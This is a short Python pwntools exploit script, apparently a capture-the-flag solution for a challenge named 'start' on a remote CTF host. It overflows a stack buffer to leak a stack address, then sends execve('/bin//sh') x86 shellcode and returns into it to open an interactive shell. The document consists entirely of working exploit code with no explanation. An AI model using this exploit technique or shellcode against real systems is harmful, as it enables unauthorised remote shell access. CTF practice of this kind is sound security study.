from pwn import *
context.log_level='debug'
# io = process("./start")
io = remote("node4.buuoj.cn",25817)
payload = 'a'*0x14+ p32(0x08048087)
io.recv()
io.send(payload)
addr = u32(io.recv(4))
log.info('addr:'+hex(addr))
shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
payload = 'a'*0x14+ p32(addr + 0x14)+ shellcode
# gdb.attach(io)
io.send(payload)
io.interactive()